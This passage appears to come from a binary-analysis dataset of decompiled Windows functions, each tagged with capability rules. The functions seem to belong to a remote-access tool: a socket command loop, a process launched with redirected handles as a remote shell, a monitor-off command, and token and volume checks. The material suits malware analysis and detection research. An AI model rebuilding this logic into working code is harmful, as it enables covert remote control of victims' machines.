        "decompiled_code": "\nvoid fcn.0048619c(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t *in_FS_OFFSET;\n    ushort uStackY8228;\n    ushort uStackY8226;\n    int32_t iStackY8224;\n    uchar auStackY8212 [3976];\n    uint uStackY4236;\n    uchar *puStackY4228;\n    uint uStackY4224;\n    uint uStackY4220;\n    uchar *puStackY4216;\n    uchar *puStackY4212;\n    uint uStackY4208;\n    uchar *puStackY4204;\n    uchar *puStackY4200;\n    uchar *puStackY4196;\n    uint uStackY4192;\n    int32_t iStack4160;\n    uint uStack4156;\n    uchar *puStack4152;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4152 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar1 = iVar3;\n        iVar3 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack4156 = 0x486405;\n    iStack4160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefc0;\n    sub.ole32.dll_CoInitialize();\n    puVar2 = sub.wsock32.dll_socket();\n    if (puVar2 != 0xffffffff) {\n        uStackY8228 = 2;\n        uStackY8226 = sub.wsock32.dll_htons();\n        iStackY8224 = sub.wsock32.dll_inet_addr();\n        if (iStackY8224 == -1) {\n            uStackY4192 = 0x486236;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            if (iVar3 == 0) goto code_r0x004863b5;\n            iStackY8224 = ***(iVar3 + 0xc);\n        }\n        uStackY4192 = 0x10;\n        puStackY4196 = &stack0xffffdfdc;\n        puStackY4204 = 0x48625a;\n        puStackY4200 = puVar2;\n        sub.wsock32.dll_connect();\n        puStackY4204 = NULL;\n        uStackY4208 = 1;\n        puStackY4212 = &stack0xffffdfec;\n        uStackY4220 = 0x48626b;\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uStackY4220 = 0x486283;\n            fcn.00409d60();\n            uStackY4220 = 0x486299;\n            fcn.00405864();\n            uStackY4220 = 0x4862a6;\n            fcn.00474dbc();\n            uStackY4220 = 0;\n            uStackY4224 = 1;\n            puStackY4228 = &stack0xffffdfec;\n            uStackY4236 = 0x4862b7;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                uStackY4236 = 0x4862ca;\n                var_10h = fcn.00464d3c();\n                uStackY4236 = 0x4862db;\n                fcn.00464dcc();\n                uStackY4236 = 0x4862e7;\n                var_ch = fcn.00404620();\n                while (*(iVar1 + 0xd) == '\\0') {\n                    uStackY4192 = 0;\n                    puStackY4196 = 0x2000;\n                    puStackY4200 = &stack0xffffdfec;\n                    uStackY4208 = 0x486303;\n                    iVar3 = sub.wsock32.dll_recv();\n                    if (iVar3 < 1) {\n                        uStackY4208 = 0x486316;\n                        fcn.00474d1c();\n                        break;\n                    }\n                    uStackY4208 = 0x48632c;\n                    fcn.00464e58();\n                    uStackY4208 = 0;\n                    puStackY4216 = 0x486338;\n                    fcn.0041b724(0, 0);\n                    do {\n                        uStackY4192 = 0x48634a;\n                        fcn.00403af4();\n                        uStackY4192 = 0x48635d;\n                        puVar4 = (**(*var_ch + 0xc))();\n                        if (puVar4 == NULL) break;\n                        uStackY4192 = 0;\n                        puStackY4200 = &stack0xffffdfec;\n                        uStackY4208 = 0x486373;\n                        puStackY4204 = puVar2;\n                        puStackY4196 = puVar4;\n                        sub.wsock32.dll_send();\n                        uStackY4208 = 0;\n                        puStackY4212 = 0x2000;\n                        puStackY4216 = &stack0xffffdfec;\n                        uStackY4224 = 0x486387;\n                        sub.wsock32.dll_recv();\n                    } while (puVar4 != NULL);\n                    if (*(iVar1 + 0xd) != '\\0') break;\n                    uStackY4192 = 0x48639c;\n                    fcn.0041be34();\n                    uStackY4192 = 0x4863a8;\n                    fcn.00474e58();\n                }\n            }\n        }\n    }\ncode_r0x004863b5:\n    if (var_ch != NULL) {\n        uStackY4192 = 0x4863c3;\n        fcn.0040f934();\n    }\n    if (var_10h != 0) {\n        uStackY4192 = 0x4863d1;\n        fcn.00464d98();\n        uStackY4192 = 0x4863d9;\n        fcn.0040f934();\n    }\n    uStackY4192 = 2;\n    puStackY4200 = 0x4863e1;\n    puStackY4196 = puVar2;\n    sub.wsock32.dll_shutdown();\n    puStackY4204 = 0x4863e7;\n    puStackY4200 = puVar2;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStackY4200;\n    uStackY4192 = 0x48640c;\n    puStackY4196 = 0x486404;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1499
    },
    "00486460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00486460(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 49
    },
    "004864e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004864e4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x50) != '\\0') {\n        fcn.004884e4();\n    }\n    if (*(in_EAX + 0x51) != '\\0') {\n        fcn.00488638();\n    }\n    if (*(in_EAX + 0x52) != '\\0') {\n        fcn.004897e8();\n    }\n    if (*(in_EAX + 0x53) != '\\0') {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0048652c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048652c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x50) != '\\0') {\n        fcn.004884e4();\n    }\n    if (*(in_EAX + 0x51) != '\\0') {\n        fcn.00488638();\n    }\n    if (*(in_EAX + 0x52) != '\\0') {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 2);\n    }\n    if (*(in_EAX + 0x53) != '\\0') {\n        fcn.004897e8();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00486574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00486574(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *in_FS_OFFSET;\n    uchar uVar6;\n    ushort uStackY8236;\n    ushort uStackY8234;\n    int32_t iStackY8232;\n    uchar auStackY8220 [3976];\n    uint uStackY4244;\n    uchar *puStackY4236;\n    uint uStackY4232;\n    uint uStackY4228;\n    uchar *puStackY4224;\n    uchar *puStackY4220;\n    uint uStackY4216;\n    uchar *puStackY4212;\n    uchar *puStackY4208;\n    uchar *puStackY4204;\n    uint uStackY4200;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    iVar4 = 2;\n    do {\n        iVar2 = iVar4;\n        iVar4 = iVar2 + -1;\n    } while (iVar2 + -1 != 0);\n    uStack4168 = 0x4868ad;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    puVar3 = sub.wsock32.dll_socket();\n    if (puVar3 != 0xffffffff) {\n        uStackY8236 = 2;\n        uStackY8234 = sub.wsock32.dll_htons();\n        iStackY8232 = sub.wsock32.dll_inet_addr();\n        if (iStackY8232 == -1) {\n            uStackY4200 = 0x486614;\n            iVar4 = sub.wsock32.dll_gethostbyname();\n            if (iVar4 == 0) goto code_r0x00486837;\n            iStackY8232 = ***(iVar4 + 0xc);\n        }\n        uStackY4200 = 0x10;\n        puStackY4204 = &stack0xffffdfd4;\n        puStackY4212 = 0x48663b;\n        puStackY4208 = puVar3;\n        sub.wsock32.dll_connect();\n        puStackY4212 = NULL;\n        uStackY4216 = 0x2000;\n        puStackY4220 = &stack0xffffdfe4;\n        uStackY4228 = 0x486652;\n        iVar4 = sub.wsock32.dll_recv();\n        if (iVar4 != -1) {\n            uStackY4228 = 0x486667;\n            fcn.00409d60();\n            uStackY4228 = 0x48667d;\n            fcn.00405864();\n            uStackY4228 = 0x48668b;\n            fcn.00474dbc();\n            uStackY4228 = 0;\n            uStackY4232 = 0x2000;\n            puStackY4236 = &stack0xffffdfe4;\n            uStackY4244 = 0x4866a2;\n            iVar4 = sub.wsock32.dll_recv();\n            if (iVar4 != -1) {\n                uStackY4244 = 0x4866b6;\n                fcn.00405584();\n                **0x492770 = *(iVar2 + 0x44);\n                uStackY4244 = 0x4866c5;\n                fcn.00487160();\n                uStackY4244 = 0x4866d1;\n                var_14h = fcn.00404620();\n                uStackY4244 = 0x4866e2;\n                var_18h = fcn.0041f9b4();\n                *(var_18h + 0xf) = 1;\n                uStackY4244 = 0x4866f6;\n                fcn.0041fbc0();\n                uStackY4244 = 0x486701;\n                fcn.00487018();\n                uStackY4244 = 0x486709;\n                fcn.0041fe70();\n                uStackY4244 = 0x486710;\n                fcn.0048652c();\n                while (*(iVar2 + 0xd) == '\\0') {\n                    uStackY4200 = 0;\n                    puStackY4204 = 0x2000;\n                    puStackY4208 = &stack0xffffdfe4;\n                    uStackY4216 = 0x48672c;\n                    iVar4 = sub.wsock32.dll_recv();\n                    uVar6 = iVar4 == 0;\n                    if (iVar4 < 1) break;\n                    do {\n                        uStackY4200 = 0x486747;\n                        fcn.004873b8();\n                        uStackY4200 = 0;\n                        puStackY4208 = 0x486753;\n                        fcn.0041b724(0, 0);\n                        puStackY4208 = 0x486761;\n                        fcn.0048b434();\n                        puStackY4208 = 0x48676f;\n                        fcn.0045f4c0();\n                        puStackY4208 = 0x48677a;\n                        fcn.00405974();\n                        if (uVar6) {\n                            puStackY4208 = 0x486784;\n                            fcn.0041be34();\n                            puStackY4212 = 0x48678b;\n                            sub.kernel32.dll_Sleep_1();\n                        }\n                        uStackY4200 = 0x486796;\n                        fcn.00405974();\n                    } while ((uVar6) && (uVar6 = *(iVar2 + 0xd) == '\\0',  uVar6));\n                    if (*(iVar2 + 0xd) != '\\0') break;\n                    uStackY4200 = 0x4867b3;\n                    fcn.004055c8();\n                    while( true ) {\n                        uStackY4200 = 0x4867c5;\n                        fcn.00403af4();\n                        uStackY4200 = 0x4867d8;\n                        puVar5 = (**(*var_14h + 0xc))();\n                        if (puVar5 == NULL) break;\n                        uStackY4200 = 0;\n                        puStackY4208 = &stack0xffffdfe4;\n                        uStackY4216 = 0x4867f1;\n                        puStackY4212 = puVar3;\n                        puStackY4204 = puVar5;\n                        sub.wsock32.dll_send();\n                        uStackY4216 = 0;\n                        puStackY4220 = 0x2000;\n                        puStackY4224 = &stack0xffffdfe4;\n                        uStackY4232 = 0x486808;\n                        sub.wsock32.dll_recv();\n                        if ((puVar5 == NULL) || (*(iVar2 + 0xd) != '\\0')) break;\n                    }\n                    if (*(iVar2 + 0xd) != '\\0') break;\n                    uStackY4200 = 0x486820;\n                    fcn.0041be34();\n                    uStackY4200 = 0x48682d;\n                    fcn.00474e58();\n                }\n            }\n        }\n    }\ncode_r0x00486837:\n    uStackY4200 = 0x48683e;\n    fcn.004864e4();\n    if (var_18h != 0) {\n        uStackY4200 = 0x48684c;\n        cVar1 = fcn.0048701c();\n        if (cVar1 != '\\0') {\n            uStackY4200 = 0x486858;\n            fcn.00486ffc();\n            uStackY4200 = 0x486860;\n            fcn.0041fe98();\n        }\n    }\n    if (var_14h != NULL) {\n        uStackY4200 = 0x48686e;\n        fcn.0040f934();\n    }\n    uStackY4200 = 2;\n    puStackY4208 = 0x486879;\n    puStackY4204 = puVar3;\n    sub.wsock32.dll_shutdown();\n    puStackY4212 = 0x486882;\n    puStackY4208 = puVar3;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStackY4208;\n    uStackY4200 = 0x4868b4;\n    puStackY4204 = 0x48689f;\n    fcn.00405554();\n    puStackY4204 = 0x4868ac;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1978
    },
    "00486af4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00486af4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 50
    },
    "0048701c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0048701c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 50
    },
    "00488ef4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00488ef4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x488f0d;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x488f27;\n        fcn.0040a918();\n        puStack920 = 0x488f34;\n        fcn.0040a918();\n        puStack920 = 0x488f41;\n        fcn.0040a918();\n        uStack924 = 0x4890e3;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.00488ef4::var_1h + 1;\n        fcn.00403af4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.00488ef4::lpFileName, 0xc0000000, 3, &fcn.00488ef4::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f70();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.00488ef4::var_323h, 0xc0000000, 3, &fcn.00488ef4::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n            else {\n                fcn.00403af4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.00488ef4::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.00488ef4::var_368h, \n                                   &fcn.00488ef4::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x4890ea);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1046
    },
    "0048974c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048974c(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffcc;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x489764;\n    fcn.004059cc();\n    puStack28 = 0x48976c;\n    fcn.004059cc();\n    uStack32 = 0x4897d7;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc();\n    iVar2 = sub.kernel32.dll_LoadLibraryA(uVar1);\n    if ((iVar2 != 0) && (iVar2 = sub.kernel32.dll_GetModuleHandleA_2(uVar1),  iVar2 != 0)) {\n        uVar1 = fcn.004059dc();\n        uVar1 = sub.kernel32.dll_GetProcAddress_1(iVar2, uVar1);\n        *param_1 = uVar1;\n        in_stack_ffffffcc = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405554(0x4897de);\n    return;\n}\n",
        "token_count": 328
    },
    "00489f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048a0be)\n\nvoid fcn.00489f50(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint ReturnLength;\n    int32_t var_14h;\n    int32_t TokenInformation;\n    uint TokenHandle;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x48a0fb;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48a096;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = &fcn.00489f50::TokenHandle;\n    uStack76 = 8;\n    uStack80 = 0x489f8b;\n    uStack80 = sub.kernel32.dll_GetCurrentProcess();\n    puStack84 = 0x489f91;\n    iVar1 = sub.advapi32.dll_OpenProcessToken();\n    if (iVar1 == 0) {\n        puStack84 = 0x48a08c;\n        fcn.00405584();\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x48a0b8;\n        fcn.00409b6c();\n        *in_FS_OFFSET = puStack84;\n        uStack76 = 0x48a102;\n        uStack80 = 0x48a0f2;\n        fcn.00405530();\n        uStack80 = 0x48a0fa;\n        fcn.00405530();\n        return;\n    }\n    uStack88 = 0x48a078;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x12, &fcn.00489f50::TokenInformation, 4, &fcn.00489f50::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else if (TokenInformation == 1) {\n        fcn.004055c8();\n    }\n    else if (TokenInformation == 2) {\n        fcn.004055c8();\n    }\n    else if (TokenInformation == 3) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.004055c8();\n    }\n    uVar2 = TokenHandle;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x14, &fcn.00489f50::var_14h, 4, &fcn.00489f50::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else if (var_14h == 0) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48a08c);\n    return;\n}\n",
        "token_count": 826
    },
    "0048a864": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048a864(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    int64_t iVar3;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    double dStack12;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack52 = 0x48a933;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    dStack12 = param_1;\n    iVar1 = -1;\n    do {\n        dStack12 = dStack12 / *0x48a944;\n        iVar1 = iVar1 + 1;\n        iVar3 = fcn.0040345c();\n        if (iVar3 == 0) {\n            dStack12 = dStack12 * *0x48a944;\n            break;\n        }\n    } while (iVar1 < 4);\n    fVar2 = dStack12;\n    arg_8h = SUB104(fVar2, 0);\n    fcn.00403420(arg_8h, fVar2 >> 0x20, fVar2 >> 0x40, &var_ch);\n    _var_20h = dStack12;\n    var_14h = &var_20h;\n    var_10h._0_1_ = 3;\n    fcn.0040af88(arg_8h);\n    fcn.00405864();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405530(0xa93a);\n    return;\n}\n",
        "token_count": 407
    },
    "0048ae34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048aedf)\n\nvoid __fastcall fcn.0048ae34(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint var_120h;\n    uint var_11ch;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack320 = &stack0xfffffffc;\n    puStack308 = 0x48ae5c;\n    var_8h = param_2;\n    fcn.004059cc();\n    uStack312 = 0x48af34;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    uStack324 = 0x48aef7;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    uVar2 = 0;\n    puStack308 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(&fcn.0048ae34::var_115h, 0x105, 0, &fcn.0048ae34::var_ch, &fcn.0048ae34::var_10h, 0, 0);\n    sub.kernel32.dll_GetVolumeInformationA();\n    fcn.004057a0();\n    fcn.00409b6c();\n    fcn.00405584();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48af3b);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 421
    },
    "0048b2e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048b2e4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_560h;\n    uint var_55ch;\n    uint var_15ch;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.004059cc();\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffa84;\n    fcn.00405530();\n    fcn.00405530();\n    cVar1 = fcn.0040a25c();\n    if (cVar1 != '\\0') {\n        fcn.00403770();\n        **0x49268c = 0;\n        fcn.00403e68();\n        fcn.0040305c();\n        iVar2 = 0;\n        fcn.00403e90();\n        fcn.0040305c();\n        while( true ) {\n            fcn.00403af4();\n            arg_8h_00 = &var_10h;\n            fcn.004038d8(arg_8h_00);\n            fcn.0040305c();\n            if (var_10h < 1) break;\n            iVar2 = iVar2 + 1;\n            fcn.004057a0();\n            fcn.00405818();\n            if ((in_EDX <= iVar2) || (var_10h == 0)) break;\n        }\n        fcn.00405584();\n        fcn.00403918();\n        fcn.0040305c();\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00405530();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 433
    },
    "0048bd7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.0048bd7c(void)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint arg_8h;\n    uint32_t *puStack100;\n    \n    iVar1 = sub.advapi32.dll_IsValidSid();\n    if (iVar1 != 0) {\n        pcVar2 = sub.advapi32.dll_GetSidIdentifierAuthority();\n        puVar3 = sub.advapi32.dll_GetSidSubAuthorityCount();\n        uVar5 = *puVar3;\n        uVar4 = uVar5 * 0xc + 0x1c;\n        if (uVar4 < *in_EAX || uVar4 == *in_EAX) {\n            fcn.0040af08(0);\n            if ((*pcVar2 == '\\0') && (pcVar2[1] == '\\0')) {\n                arg_8h = 0;\n                fcn.0040a858();\n                fcn.0040af08(arg_8h);\n            }\n            else {\n                arg_8h = 5;\n                fcn.0040a858();\n                fcn.0040af08(arg_8h);\n            }\n            fcn.0040a858();\n            do {\n                sub.advapi32.dll_GetSidSubAuthority();\n                fcn.0040af08(arg_8h);\n                fcn.0040a858();\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n            puStack100 = 0xffffffff;\n        }\n        else {\n            *in_EAX = uVar4;\n            sub.kernel32.dll_SetLastError(0x7a);\n            puStack100 = in_EAX;\n        }\n    }\n    return puStack100;\n}\n",
        "token_count": 414
    },
    "0048c5a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
